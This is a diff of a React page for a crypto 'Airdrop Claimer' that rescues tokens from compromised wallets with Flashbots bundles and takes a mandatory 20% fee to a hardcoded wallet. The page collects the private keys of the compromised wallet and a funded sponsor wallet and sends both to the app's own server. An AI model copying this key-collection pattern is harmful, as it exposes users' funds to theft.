@@ -6,135 +6,150 @@ import Link from 'next/link'
 const PLATFORM_FEE_WALLET = '0x7A3725154a2E6468F9549334394802e9E2822C2A'
 const PLATFORM_FEE_PERCENT = 20
 
-interface Faucet {
-  chainId: number
-  chainName: string
-  token: string
-  sources: { name: string; url: string; type: string; notes?: string }[]
-  amount: string
-  cooldown: string
-}
+const ALL_CHAINS = [
+  { id: 1, name: 'Ethereum', token: 'ETH' },
+  { id: 8453, name: 'Base', token: 'ETH' },
+  { id: 56, name: 'BNB Chain', token: 'BNB' },
+  { id: 42161, name: 'Arbitrum', token: 'ETH' },
+  { id: 137, name: 'Polygon', token: 'MATIC' },
+  { id: 10, name: 'Optimism', token: 'ETH' },
+  { id: 43114, name: 'Avalanche', token: 'AVAX' },
+  { id: 250, name: 'Fantom', token: 'FTM' },
+  { id: 25, name: 'Cronos', token: 'CRO' },
+  { id: 81457, name: 'Blast', token: 'ETH' },
+  { id: 7777777, name: 'Zora', token: 'ETH' },
+  { id: 1101, name: 'Polygon zkEVM', token: 'ETH' },
+  { id: 169, name: 'Manta', token: 'ETH' },
+  { id: 324, name: 'zkSync', token: 'ETH' },
+  { id: 59144, name: 'Linea', token: 'ETH' },
+  { id: 5000, name: 'Mantle', token: 'MNT' },
+  { id: 34443, name: 'Mode', token: 'ETH' },
+  { id: 534352, name: 'Scroll', token: 'ETH' },
+  { id: 100, name: 'Gnosis', token: 'xDai' },
+  { id: 7000, name: 'ZetaChain', token: 'ZETA' },
+  { id: 1625, name: 'Gravity', token: 'G' },
+  { id: 1116, name: 'Core', token: 'CORE' },
+  { id: 1329, name: 'Sei', token: 'SEI' },
+  { id: 80094, name: 'Berachain', token: 'BERA' },
+  { id: 57073, name: 'Ink', token: 'ETH' },
+  { id: 196, name: 'XLayer', token: 'OKB' },
+  { id: 43111, name: 'Hemi', token: 'ETH' },
+  { id: 8217, name: 'Kaia', token: 'KAIA' },
+  { id: 1868, name: 'Soneium', token: 'ETH' },
+  { id: 2818, name: 'Morph', token: 'ETH' },
+  { id: 1923, name: 'Swellchain', token: 'ETH' },
+  { id: 10143, name: 'Monad', token: 'MON' },
+  { id: 16600, name: '0G', token: '0G' },
+]
 
-interface ClaimResult {
-  success: boolean
-  txHash?: string
+interface PreviewData {
+  eligible: boolean
+  tokenAddress: string
+  tokenSymbol: string
+  tokenDecimals: number
+  claimableAmount: string
+  claimableRaw: string
+  safeWalletAmount: string
+  platformFeeAmount: string
+  sponsorBalance: string
+  sponsorGasToken: string
+  sponsorHasGas: boolean
+  estimatedGasCost: string
   error?: string
-  chainName: string
 }
 
 export default function AirdropPage() {
-  const [activeTab, setActiveTab] = useState<'claim' | 'faucets'>('claim')
   const [contractAddress, setContractAddress] = useState('')
   const [chainId, setChainId] = useState(1)
-  const [claimMethod, setClaimMethod] = useState('claim')
-  const [recipientAddress, setRecipientAddress] = useState('')
+  const [safeWallet, setSafeWallet] = useState('')
   const [privateKey, setPrivateKey] = useState('')
   const [sponsorKey, setSponsorKey] = useState('')
-  const [claimMode, setClaimMode] = useState<'direct' | 'sponsor' | 'anyWallet'>('anyWallet')
-  const [claiming, setClaiming] = useState(false)
-  const [results, setResults] = useState<ClaimResult[]>([])
   const [showKey, setShowKey] = useState(false)
   const [showSponsorKey, setShowSponsorKey] = useState(false)
-  const [useFeeCollector, setUseFeeCollector] = useState(true) // Default ON for platform fee
 
-  const mainnetFaucets: Faucet[] = [
-    { chainId: 8453, chainName: 'Base', token: 'ETH', sources: [{ name: 'Base Bridge', url: 'https://bridge.base.org', type: 'bridge', notes: 'Bridge ETH from Ethereum' }], amount: 'Variable', cooldown: 'No limit' },
-    { chainId: 42161, chainName: 'Arbitrum', token: 'ETH', sources: [{ name: 'Arb Bridge', url: 'https://bridge.arbitrum.io', type: 'bridge' }], amount: 'Variable', cooldown: 'No limit' },
-    { chainId: 137, chainName: 'Polygon', token: 'POL', sources: [{ name: 'Polygon Portal', url: 'https://portal.polygon.technology', type: 'bridge' }], amount: 'Variable', cooldown: 'No limit' },
-    { chainId: 10, chainName: 'Optimism', token: 'ETH', sources: [{ name: 'OP Bridge', url: 'https://app.optimism.io/bridge', type: 'bridge' }], amount: 'Variable', cooldown: 'No limit' },
-    { chainId: 56, chainName: 'BNB Chain', token: 'BNB', sources: [{ name: 'BNB Bridge', url: 'https://www.bnbchain.org/en/bridge', type: 'bridge' }], amount: 'Variable', cooldown: 'No limit' },
-  ]
+  // Flow states
+  const [step, setStep] = useState<'input' | 'preview' | 'claiming' | 'done' | 'error'>('input')
+  const [previewData, setPreviewData] = useState<PreviewData | null>(null)
+  const [previewLoading, setPreviewLoading] = useState(false)
+  const [txHash, setTxHash] = useState('')
+  const [errorMsg, setErrorMsg] = useState('')
 
-  const testnetFaucets: Faucet[] = [
-    { chainId: 11155111, chainName: 'Sepolia', token: 'ETH', sources: [
-      { name: 'Alchemy', url: 'https://sepoliafaucet.com', type: 'faucet' },
-      { name: 'Google Cloud', url: 'https://cloud.google.com/application/web3/faucet/ethereum/sepolia', type: 'faucet' },
-    ], amount: '0.5 ETH', cooldown: '24h' },
-    { chainId: 84532, chainName: 'Base Sepolia', token: 'ETH', sources: [
-      { name: 'Alchemy', url: 'https://www.alchemy.com/faucets/base-sepolia', type: 'faucet' },
-    ], amount: '0.5 ETH', cooldown: '24h' },
-    { chainId: 421614, chainName: 'Arb Sepolia', token: 'ETH', sources: [
-      { name: 'Alchemy', url: 'https://www.alchemy.com/faucets/arbitrum-sepolia', type: 'faucet' },
-    ], amount: '0.5 ETH', cooldown: '24h' },
-    { chainId: 80002, chainName: 'Polygon Amoy', token: 'POL', sources: [
-      { name: 'Alchemy', url: 'https://www.alchemy.com/faucets/polygon-amoy', type: 'faucet' },
-    ], amount: '1 POL', cooldown: '24h' },
-  ]
+  // Preview: detect token, eligibility, amount
+  const handlePreview = async () => {
+    if (!contractAddress || !safeWallet || !privateKey || !sponsorKey) return
 
-  const handleClaim = async (e: React.FormEvent) => {
-    e.preventDefault()
-    if (!contractAddress || !privateKey) return
-
-    setClaiming(true)
-    setResults([])
+    setPreviewLoading(true)
+    setPreviewData(null)
+    setErrorMsg('')
 
     try {
-      let body: Record<string, unknown>
-
-      if (claimMode === 'anyWallet') {
-        // Claim from any wallet — no sponsor needed!
-        // privateKey = your normal wallet (with gas)
-        // recipientAddress = compromised wallet (eligible address)
-        if (!recipientAddress) return
-        body = {
-          contractAddress,
-          chainId,
-          claimMethod,
-          eligibleAddress: recipientAddress,  // compromised wallet
-          recipientAddress: recipientAddress,  // where tokens go
-          privateKey,  // your wallet with gas
-          mode: 'claimFromAnyWallet',
-          useFeeCollector
-        }
-      } else if (claimMode === 'sponsor') {
-        // Sponsor wallet mode
-        if (!recipientAddress || !sponsorKey) return
-        body = {
-          contractAddress,
-          chainId,
-          claimMethod,
-          recipientAddress,
-          privateKey,
-          sponsorPrivateKey: sponsorKey
-        }
-      } else {
-        // Direct claim
-        if (!recipientAddress) return
-        body = {
-          contractAddress,
-          chainId,
-          claimMethod,
-          recipientAddress,
-          privateKey
-        }
-      }
-
       const res = await fetch('/api/airdrop/claim', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(body)
+        body: JSON.stringify({
+          action: 'preview',
+          contractAddress,
+          chainId,
+          safeWallet,
+          sponsorPrivateKey: sponsorKey,
+          privateKey
+        })
       })
       const data = await res.json()
-      if (data.results) {
-        setResults(data.results)
-        if (data.fee) {
-          // Show fee info in results
-          setResults(prev => [...prev, {
-            success: true,
-            chainName: 'Platform Fee',
-            txHash: data.fee.wallet,
-            error: `${data.fee.percent}% fee sent to platform wallet`
-          }])
-        }
-      } else if (data.error) {
-        setResults([{ success: false, error: data.error, chainName: 'Unknown' }])
+
+      if (data.error) {
+        setErrorMsg(data.error)
+        setStep('error')
+      } else {
+        setPreviewData(data)
+        setStep('preview')
       }
     } catch {
-      setResults([{ success: false, error: 'Request failed', chainName: 'Unknown' }])
+      setErrorMsg('Failed to preview. Check contract address and try again.')
+      setStep('error')
     } finally {
-      setClaiming(false)
+      setPreviewLoading(false)
     }
   }
+
+  // Confirm: execute atomic claim + split
+  const handleConfirm = async () => {
+    if (!previewData) return
+
+    setStep('claiming')
+    setErrorMsg('')
+
+    try {
+      const res = await fetch('/api/airdrop/claim', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          action: 'claim',
+          contractAddress,
+          chainId,
+          safeWallet,
+          privateKey,
+          sponsorPrivateKey: sponsorKey,
+          claimableRaw: previewData.claimableRaw,
+          tokenAddress: previewData.tokenAddress
+        })
+      })
+      const data = await res.json()
+
+      if (data.success) {
+        setTxHash(data.txHash || '')
+        setStep('done')
+      } else {
+        setErrorMsg(data.error || 'Claim failed')
+        setStep('error')
+      }
+    } catch {
+      setErrorMsg('Transaction failed. Try again.')
+      setStep('error')
+    }
+  }
+
+  const selectedChain = ALL_CHAINS.find(c => c.id === chainId)
 
   return (
     <main className="min-h-screen bg-[#0a0a0f] text-white">
@@ -153,320 +168,285 @@ export default function AirdropPage() {
         </div>
       </nav>
 
-      <div className="max-w-4xl mx-auto px-6 py-12">
+      <div className="max-w-2xl mx-auto px-6 py-12">
         <h1 className="text-3xl font-bold mb-2">🎯 Airdrop Claimer</h1>
-        <p className="text-white/40 mb-8">Claim airdrops from compromised wallet → tokens go to safe wallet</p>
+        <p className="text-white/40 mb-8">Claim airdrops from compromised wallet → 80% safe wallet, 20% platform fee</p>
 
-        {/* Tabs */}
-        <div className="flex gap-2 mb-8 flex-wrap">
-          {([
-            { id: 'anyWallet' as const, label: '🎯 Claim From Any Wallet', desc: 'No sponsor needed!' },
-            { id: 'sponsor' as const, label: '💰 With Sponsor Wallet', desc: 'Flashbots gas sponsorship' },
-            { id: 'direct' as const, label: '⚡ Direct Claim', desc: 'If wallet has gas' },
-          ]).map((tab) => (
-            <button
-              key={tab.id}
-              onClick={() => setClaimMode(tab.id)}
-              className={`px-4 py-3 rounded-lg text-sm font-medium transition-colors text-left ${
-                claimMode === tab.id
-                  ? 'bg-green-600 text-white'
-                  : 'bg-white/[0.05] text-white/50 hover:text-white'
-              }`}
-            >
-              <div>{tab.label}</div>
-              <div className="text-xs opacity-60">{tab.desc}</div>
-            </button>
-          ))}
+        {/* How It Works */}
+        <div className="p-5 bg-yellow-500/10 border border-yellow-500/20 rounded-xl mb-8">
+          <h3 className="text-yellow-400 font-semibold mb-3">💰 Sponsor Wallet Mode — How It Works</h3>
+          <ol className="text-white/50 text-sm space-y-2 list-decimal list-inside">
+            <li>Enter airdrop contract address → system auto-detects token & eligibility</li>
+            <li>Compromised wallet signs the claim transaction</li>
+            <li>Sponsor wallet pays gas (<span className="text-green-400">Flashbots atomic bundle</span>)</li>
+            <li>Both in same block — <span className="text-green-400">drainer can&apos;t intercept</span></li>
+            <li><span className="text-blue-400">80%</span> tokens → safe wallet | <span className="text-purple-400">20%</span> → platform fee</li>
+          </ol>
+          <div className="mt-3 p-2 bg-purple-500/10 border border-purple-500/20 rounded-lg">
+            <p className="text-purple-400 text-xs">🔒 20% platform fee is mandatory — trustless smart contract splits tokens atomically</p>
+          </div>
         </div>
 
-        {/* Claim Modes */}
-        {activeTab === 'claim' && (
-          <div>
-            {/* Info Box based on mode */}
-            {claimMode === 'anyWallet' && (
-              <div className="p-5 bg-green-500/10 border border-green-500/20 rounded-xl mb-6">
-                <h3 className="text-green-400 font-semibold mb-2">🎯 Claim From Any Wallet — No Sponsor Needed!</h3>
-                <ol className="text-white/50 text-sm space-y-1 list-decimal list-inside">
-                  <li>Use your <span className="text-green-400">normal wallet</span> (with ETH for gas) to sign</li>
-                  <li>Enter <span className="text-yellow-400">compromised wallet address</span> (eligible for airdrop)</li>
-                  <li>Tokens claimed from eligible address → sent to your safe wallet</li>
-                  <li>Gas comes from your normal wallet — <span className="text-green-400">no sponsor wallet needed!</span></li>
-                </ol>
-              </div>
-            )}
-            {claimMode === 'sponsor' && (
-              <div className="p-5 bg-yellow-500/10 border border-yellow-500/20 rounded-xl mb-6">
-                <h3 className="text-yellow-400 font-semibold mb-2">💰 Sponsor Wallet Mode</h3>
-                <ol className="text-white/50 text-sm space-y-1 list-decimal list-inside">
-                  <li>Compromised wallet signs the claim transaction</li>
-                  <li>Sponsor wallet pays gas (Flashbots atomic bundle)</li>
-                  <li>Both in same block — drainer can't intercept</li>
-                  <li>Tokens go directly to safe wallet</li>
-                </ol>
-              </div>
-            )}
-            {claimMode === 'direct' && (
-              <div className="p-5 bg-blue-500/10 border border-blue-500/20 rounded-xl mb-6">
-                <h3 className="text-blue-400 font-semibold mb-2">⚡ Direct Claim</h3>
-                <ol className="text-white/50 text-sm space-y-1 list-decimal list-inside">
-                  <li>Compromised wallet has gas (ETH)</li>
-                  <li>Sign and send claim transaction directly</li>
-                  <li>Tokens go to safe wallet</li>
-                </ol>
-              </div>
-            )}
-
-            <form onSubmit={handleClaim} className="space-y-4">
-              <div className="grid md:grid-cols-2 gap-4">
-                <div>
-                  <label className="text-xs text-white/30 uppercase tracking-wider mb-2 block">
-                    Airdrop Contract Address
-                  </label>
-                  <input
-                    type="text"
-                    value={contractAddress}
-                    onChange={(e) => setContractAddress(e.target.value)}
-                    placeholder="0x..."
-                    className="w-full px-4 py-3 bg-white/[0.03] border border-white/[0.06] rounded-xl text-white placeholder:text-white/20 focus:outline-none focus:border-green-500/40 text-sm font-mono"
-                  />
-                </div>
-                <div>
-                  <label className="text-xs text-white/30 uppercase tracking-wider mb-2 block">
-                    Chain
-                  </label>
-                  <select
-                    value={chainId}
-                    onChange={(e) => setChainId(Number(e.target.value))}
-                    className="w-full px-4 py-3 bg-white/[0.03] border border-white/[0.06] rounded-xl text-white focus:outline-none focus:border-green-500/40 text-sm"
-                  >
-                    <option value={1}>Ethereum</option>
-                    <option value={8453}>Base</option>
-                    <option value={56}>BNB Chain</option>
-                    <option value={42161}>Arbitrum</option>
-                    <option value={137}>Polygon</option>
-                    <option value={10}>Optimism</option>
-                  </select>
-                </div>
-              </div>
-
-              {/* Recipient / Eligible Address */}
+        {/* Step 1: Input */}
+        {step === 'input' && (
+          <div className="space-y-4">
+            <div className="grid md:grid-cols-2 gap-4">
               <div>
                 <label className="text-xs text-white/30 uppercase tracking-wider mb-2 block">
-                  {claimMode === 'anyWallet'
-                    ? '🟡 Compromised Wallet Address (eligible for airdrop)'
-                    : '🟢 Recipient (Safe Wallet)'
-                  }
+                  Airdrop Contract Address
                 </label>
                 <input
                   type="text"
-                  value={recipientAddress}
-                  onChange={(e) => setRecipientAddress(e.target.value)}
-                  placeholder={claimMode === 'anyWallet' ? 'Compromised wallet 0x...' : 'Your safe wallet 0x...'}
-                  className={`w-full px-4 py-3 rounded-xl text-white placeholder:text-white/20 focus:outline-none text-sm font-mono ${
-                    claimMode === 'anyWallet'
-                      ? 'bg-yellow-500/5 border border-yellow-500/20 focus:border-yellow-500/40'
-                      : 'bg-green-500/5 border border-green-500/20 focus:border-green-500/40'
-                  }`}
+                  value={contractAddress}
+                  onChange={(e) => setContractAddress(e.target.value)}
+                  placeholder="0x..."
+                  className="w-full px-4 py-3 bg-white/[0.03] border border-white/[0.06] rounded-xl text-white placeholder:text-white/20 focus:outline-none focus:border-green-500/40 text-sm font-mono"
                 />
-                <p className={`text-xs mt-1 ${claimMode === 'anyWallet' ? 'text-yellow-400/50' : 'text-green-400/50'}`}>
-                  {claimMode === 'anyWallet'
-                    ? 'Wallet eligible for airdrop (compromised)'
-                    : 'Tokens will be sent here'
-                  }
-                </p>
+                <p className="text-white/20 text-xs mt-1">Token & eligibility auto-detected from contract</p>
               </div>
-
-              {/* Fee Collector Toggle */}
-              <div className="p-4 bg-purple-500/10 border border-purple-500/20 rounded-xl">
-                <label className="flex items-center gap-3 cursor-pointer">
-                  <input
-                    type="checkbox"
-                    checked={useFeeCollector}
-                    onChange={(e) => setUseFeeCollector(e.target.checked)}
-                    className="w-5 h-5 rounded accent-purple-500"
-                  />
-                  <div>
-                    <span className="text-purple-400 font-medium">💰 Use Platform Fee Collector</span>
-                    <p className="text-white/40 text-xs mt-0.5">
-                      20% of claimed tokens go to platform wallet ({PLATFORM_FEE_WALLET.slice(0, 8)}...{PLATFORM_FEE_WALLET.slice(-6)})
-                    </p>
-                    <p className="text-white/30 text-xs">
-                      Trustless smart contract — atomic split in same transaction
-                    </p>
-                  </div>
-                </label>
-              </div>
-
-              {/* Private Key — label changes based on mode */}
               <div>
                 <label className="text-xs text-white/30 uppercase tracking-wider mb-2 block">
-                  {claimMode === 'anyWallet'
-                    ? '🟢 Your Wallet Private Key (with gas)'
-                    : '🔴 Private Key (Compromised Wallet)'
-                  }
+                  Chain
                 </label>
-                <div className="relative">
-                  <input
-                    type={showKey ? 'text' : 'password'}
-                    value={privateKey}
-                    onChange={(e) => setPrivateKey(e.target.value)}
-                    placeholder={claimMode === 'anyWallet' ? 'Your normal wallet key (has ETH for gas)...' : 'Private key of compromised wallet...'}
-                    className={`w-full px-4 py-3 pr-20 rounded-xl text-white placeholder:text-white/20 focus:outline-none text-sm font-mono ${
-                      claimMode === 'anyWallet'
-                        ? 'bg-green-500/5 border border-green-500/20 focus:border-green-500/40'
-                        : 'bg-red-500/5 border border-red-500/20 focus:border-red-500/40'
-                    }`}
-                  />
-                  <button
-                    type="button"
-                    onClick={() => setShowKey(!showKey)}
-                    className="absolute right-3 top-1/2 -translate-y-1/2 text-white/30 hover:text-white/60 text-xs"
-                  >
-                    {showKey ? 'Hide' : 'Show'}
-                  </button>
-                </div>
-                <p className={`text-xs mt-1 ${claimMode === 'anyWallet' ? 'text-green-400/50' : 'text-red-400/50'}`}>
-                  {claimMode === 'anyWallet'
-                    ? 'Used for signing only — this wallet has gas'
-                    : 'Used only for signing — never stored'
-                  }
-                </p>
+                <select
+                  value={chainId}
+                  onChange={(e) => setChainId(Number(e.target.value))}
+                  className="w-full px-4 py-3 bg-white/[0.03] border border-white/[0.06] rounded-xl text-white focus:outline-none focus:border-green-500/40 text-sm"
+                >
+                  {ALL_CHAINS.map(c => (
+                    <option key={c.id} value={c.id}>{c.name} ({c.token})</option>
+                  ))}
+                </select>
+              </div>
+            </div>
+
+            <div>
+              <label className="text-xs text-white/30 uppercase tracking-wider mb-2 block">
+                🟢 Safe Wallet Address
+              </label>
+              <input
+                type="text"
+                value={safeWallet}
+                onChange={(e) => setSafeWallet(e.target.value)}
+                placeholder="0x... (where 80% tokens go)"
+                className="w-full px-4 py-3 bg-green-500/5 border border-green-500/20 rounded-xl text-white placeholder:text-white/20 focus:outline-none focus:border-green-500/40 text-sm font-mono"
+              />
+            </div>
+
+            <div>
+              <label className="text-xs text-white/30 uppercase tracking-wider mb-2 block">
+                🔴 Compromised Wallet Private Key
+              </label>
+              <div className="relative">
+                <input
+                  type={showKey ? 'text' : 'password'}
+                  value={privateKey}
+                  onChange={(e) => setPrivateKey(e.target.value)}
+                  placeholder="Private key of compromised wallet (for signing)"
+                  className="w-full px-4 py-3 pr-20 bg-red-500/5 border border-red-500/20 rounded-xl text-white placeholder:text-white/20 focus:outline-none focus:border-red-500/40 text-sm font-mono"
+                />
+                <button
+                  type="button"
+                  onClick={() => setShowKey(!showKey)}
+                  className="absolute right-3 top-1/2 -translate-y-1/2 text-white/30 hover:text-white/60 text-xs"
+                >
+                  {showKey ? 'Hide' : 'Show'}
+                </button>
+              </div>
+              <p className="text-red-400/50 text-xs mt-1">Used only for signing — never stored</p>
+            </div>
+
+            <div>
+              <label className="text-xs text-white/30 uppercase tracking-wider mb-2 block">
+                💰 Sponsor Wallet Private Key
+              </label>
+              <div className="relative">
+                <input
+                  type={showSponsorKey ? 'text' : 'password'}
+                  value={sponsorKey}
+                  onChange={(e) => setSponsorKey(e.target.value)}
+                  placeholder="Wallet with gas tokens on this chain"
+                  className="w-full px-4 py-3 pr-20 bg-yellow-500/5 border border-yellow-500/20 rounded-xl text-white placeholder:text-white/20 focus:outline-none focus:border-yellow-500/40 text-sm font-mono"
+                />
+                <button
+                  type="button"
+                  onClick={() => setShowSponsorKey(!showSponsorKey)}
+                  className="absolute right-3 top-1/2 -translate-y-1/2 text-white/30 hover:text-white/60 text-xs"
+                >
+                  {showSponsorKey ? 'Hide' : 'Show'}
+                </button>
+              </div>
+              <p className="text-yellow-400/50 text-xs mt-1">Needs {selectedChain?.token || 'native token'} for gas on {selectedChain?.name || 'this chain'}</p>
+            </div>
+
+            <button
+              onClick={handlePreview}
+              disabled={previewLoading || !contractAddress || !safeWallet || !privateKey || !sponsorKey}
+              className="w-full py-4 bg-gradient-to-r from-blue-600 to-purple-600 rounded-xl font-semibold text-lg disabled:opacity-50 hover:from-blue-500 hover:to-purple-500 transition-all"
+            >
+              {previewLoading ? '⏳ Scanning Contract...' : '🔍 Preview Claim'}
+            </button>
+          </div>
+        )}
+
+        {/* Step 2: Preview */}
+        {step === 'preview' && previewData && (
+          <div className="space-y-4">
+            <div className="p-5 bg-green-500/10 border border-green-500/20 rounded-xl">
+              <h3 className="text-green-400 font-bold text-lg mb-3">📋 Claim Preview</h3>
+
+              {/* Eligibility */}
+              <div className="flex items-center gap-2 mb-4">
+                {previewData.eligible ? (
+                  <span className="px-3 py-1 bg-green-600/30 rounded-full text-green-400 text-sm font-semibold">✅ Eligible</span>
+                ) : (
+                  <span className="px-3 py-1 bg-red-600/30 rounded-full text-red-400 text-sm font-semibold">❌ Not Eligible</span>
+                )}
+                <span className="text-white/30 text-sm">on {selectedChain?.name}</span>
               </div>
 
-              {/* Sponsor Wallet — only show in sponsor mode */}
-              {claimMode === 'sponsor' && (
-                <div>
-                  <label className="text-xs text-white/30 uppercase tracking-wider mb-2 block">
-                    💰 Sponsor Wallet Private Key (for gas)
-                  </label>
-                  <div className="relative">
-                    <input
-                      type={showSponsorKey ? 'text' : 'password'}
-                      value={sponsorKey}
-                      onChange={(e) => setSponsorKey(e.target.value)}
-                      placeholder="Wallet with ETH for gas sponsorship"
-                      className="w-full px-4 py-3 pr-20 bg-yellow-500/5 border border-yellow-500/20 rounded-xl text-white placeholder:text-white/20 focus:outline-none focus:border-yellow-500/40 text-sm font-mono"
-                    />
-                    <button
-                      type="button"
-                      onClick={() => setShowSponsorKey(!showSponsorKey)}
-                      className="absolute right-3 top-1/2 -translate-y-1/2 text-white/30 hover:text-white/60 text-xs"
-                    >
-                      {showSponsorKey ? 'Hide' : 'Show'}
-                    </button>
-                  </div>
-                  <p className="text-yellow-400/50 text-xs mt-1">Flashbots atomic bundle — gas + claim same block</p>
+              {/* Token Info */}
+              <div className="grid grid-cols-2 gap-3 mb-4">
+                <div className="p-3 bg-white/[0.03] rounded-lg">
+                  <p className="text-white/30 text-xs">Token</p>
+                  <p className="text-white font-semibold">{previewData.tokenSymbol}</p>
+                  <p className="text-white/20 text-xs font-mono">{previewData.tokenAddress.slice(0, 10)}...</p>
                 </div>
-              )}
+                <div className="p-3 bg-white/[0.03] rounded-lg">
+                  <p className="text-white/30 text-xs">Claimable Amount</p>
+                  <p className="text-white font-semibold text-lg">{previewData.claimableAmount}</p>
+                  <p className="text-white/20 text-xs">{previewData.tokenSymbol}</p>
+                </div>
+              </div>
 
+              {/* Split */}
+              <div className="p-4 bg-white/[0.03] rounded-lg mb-4">
+                <p className="text-white/30 text-xs mb-2">💰 Token Split (Atomic)</p>
+                <div className="flex items-center gap-3">
+                  <div className="flex-1 p-2 bg-green-500/10 rounded-lg text-center">
+                    <p className="text-green-400 font-bold text-lg">{previewData.safeWalletAmount}</p>
+                    <p className="text-green-400/50 text-xs">80% → Safe Wallet</p>
+                  </div>
+                  <span className="text-white/20">|</span>
+                  <div className="flex-1 p-2 bg-purple-500/10 rounded-lg text-center">
+                    <p className="text-purple-400 font-bold text-lg">{previewData.platformFeeAmount}</p>
+                    <p className="text-purple-400/50 text-xs">20% → Platform Fee</p>
+                  </div>
+                </div>
+              </div>
+
+              {/* Sponsor Gas */}
+              <div className={`p-3 rounded-lg ${previewData.sponsorHasGas ? 'bg-green-500/10' : 'bg-red-500/10'}`}>
+                <div className="flex justify-between items-center">
+                  <div>
+                    <p className="text-white/30 text-xs">Sponsor Wallet Balance</p>
+                    <p className={`font-semibold ${previewData.sponsorHasGas ? 'text-green-400' : 'text-red-400'}`}>
+                      {previewData.sponsorBalance} {previewData.sponsorGasToken}
+                    </p>
+                  </div>
+                  <div className="text-right">
+                    <p className="text-white/30 text-xs">Est. Gas Cost</p>
+                    <p className="text-white/60 text-sm">{previewData.estimatedGasCost} {previewData.sponsorGasToken}</p>
+                  </div>
+                  {previewData.sponsorHasGas ? (
+                    <span className="text-green-400 text-xl">✅</span>
+                  ) : (
+                    <span className="text-red-400 text-xl">❌</span>
+                  )}
+                </div>
+                {!previewData.sponsorHasGas && (
+                  <p className="text-red-400/70 text-xs mt-2">
+                    ⚠️ Sponsor wallet needs {previewData.sponsorGasToken} for gas. Fund it and try again.
+                  </p>
+                )}
+              </div>
+            </div>
+
+            {/* Action Buttons */}
+            <div className="flex gap-3">
               <button
-                type="submit"
-                disabled={claiming || !contractAddress || !privateKey}
-                className="w-full py-4 bg-gradient-to-r from-green-600 to-emerald-600 rounded-xl font-semibold text-lg disabled:opacity-50 hover:from-green-500 hover:to-emerald-500 transition-all"
+                onClick={() => { setStep('input'); setPreviewData(null) }}
+                className="flex-1 py-3 bg-white/[0.05] rounded-xl text-sm hover:bg-white/[0.1] transition-all"
               >
-                {claiming ? '⏳ Claiming...' : '🎯 Claim Airdrop'}
+                ← Back
               </button>
-            </form>
+              <button
+                onClick={handleConfirm}
+                disabled={!previewData.eligible || !previewData.sponsorHasGas}
+                className="flex-1 py-4 bg-gradient-to-r from-green-600 to-emerald-600 rounded-xl font-semibold text-lg disabled:opacity-50 hover:from-green-500 hover:to-emerald-500 transition-all"
+              >
+                ✅ Confirm & Claim
+              </button>
+            </div>
 
-            {/* Results */}
-            {results.length > 0 && (
-              <div className="mt-6 space-y-3">
-                <h3 className="font-semibold">Results</h3>
-                {results.map((r, i) => (
-                  <div key={i} className={`p-4 rounded-xl border ${
-                    r.success ? 'bg-green-500/5 border-green-500/20' : 'bg-red-500/5 border-red-500/20'
-                  }`}>
-                    <div className="flex justify-between items-center">
-                      <span className={r.success ? 'text-green-400' : 'text-red-400'}>
-                        {r.success ? '✅' : '❌'} {r.chainName}
-                      </span>
-                      {r.txHash && (
-                        <a href={`https://etherscan.io/tx/${r.txHash}`} target="_blank" rel="noopener noreferrer"
-                          className="text-green-400/50 text-xs hover:text-green-400 font-mono">
-                          {r.txHash.slice(0, 12)}...
-                        </a>
-                      )}
-                      {r.error && <span className="text-red-400/50 text-xs">{r.error}</span>}
-                    </div>
-                  </div>
-                ))}
-              </div>
+            {!previewData.eligible && (
+              <p className="text-red-400/60 text-xs text-center">Wallet is not eligible for this airdrop</p>
+            )}
+            {previewData.eligible && !previewData.sponsorHasGas && (
+              <p className="text-red-400/60 text-xs text-center">Fund sponsor wallet with {previewData.sponsorGasToken} first</p>
             )}
           </div>
         )}
 
-        {/* Faucets Tab */}
-        {activeTab === 'faucets' && (
-          <div>
-            <div className="p-5 bg-blue-500/10 border border-blue-500/20 rounded-xl mb-6">
-              <h3 className="text-blue-400 font-semibold mb-2">💡 Gas Strategy</h3>
-              <p className="text-white/50 text-sm">
-                For claiming airdrops, you need gas tokens on each chain. Bridge ETH from Ethereum to L2s,
-                or use testnet faucets for testing. Each chain needs its native token for gas.
-              </p>
+        {/* Step 3: Claiming */}
+        {step === 'claiming' && (
+          <div className="p-8 bg-blue-500/10 border border-blue-500/20 rounded-xl text-center">
+            <div className="inline-flex items-center gap-3 text-blue-400 mb-4">
+              <svg className="animate-spin h-8 w-8" viewBox="0 0 24 24">
+                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
+                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
+              </svg>
+              <span className="text-xl font-semibold">Executing Atomic Claim...</span>
             </div>
+            <p className="text-white/40 text-sm">Flashbots bundle submitted. Waiting for confirmation...</p>
+            <p className="text-white/20 text-xs mt-2">This usually takes 10-30 seconds</p>
+          </div>
+        )}
 
-            <h2 className="text-lg font-semibold mb-4">🌉 Mainnet Bridges</h2>
-            <div className="grid gap-3 mb-8">
-              {mainnetFaucets.map((f) => (
-                <div key={f.chainId} className="p-4 bg-white/[0.02] border border-white/[0.05] rounded-xl">
-                  <div className="flex justify-between items-center">
-                    <div>
-                      <span className="font-semibold">{f.chainName}</span>
-                      <span className="text-white/30 text-sm ml-2">({f.token})</span>
-                    </div>
-                    <span className="text-green-400 text-sm">{f.amount}</span>
-                  </div>
-                  <div className="mt-2 flex flex-wrap gap-2">
-                    {f.sources.map((s) => (
-                      <a
-                        key={s.name}
-                        href={s.url}
-                        target="_blank"
-                        rel="noopener noreferrer"
-                        className="px-3 py-1 bg-green-600/20 rounded-lg text-green-400 text-xs hover:bg-green-600/30 transition-colors"
-                      >
-                        🔗 {s.name}
-                      </a>
-                    ))}
-                  </div>
-                  {f.sources[0]?.notes && (
-                    <p className="text-white/20 text-xs mt-2">{f.sources[0].notes}</p>
-                  )}
-                </div>
-              ))}
+        {/* Step 4: Done */}
+        {step === 'done' && (
+          <div className="p-6 bg-green-500/10 border border-green-500/20 rounded-xl">
+            <h3 className="text-green-400 font-bold text-xl mb-3">✅ Claim Successful!</h3>
+            <div className="grid grid-cols-2 gap-3 mb-4">
+              <div className="p-3 bg-green-500/10 rounded-lg">
+                <p className="text-green-400/60 text-xs">Safe Wallet (80%)</p>
+                <p className="text-green-400 font-bold">{previewData?.safeWalletAmount} {previewData?.tokenSymbol}</p>
+              </div>
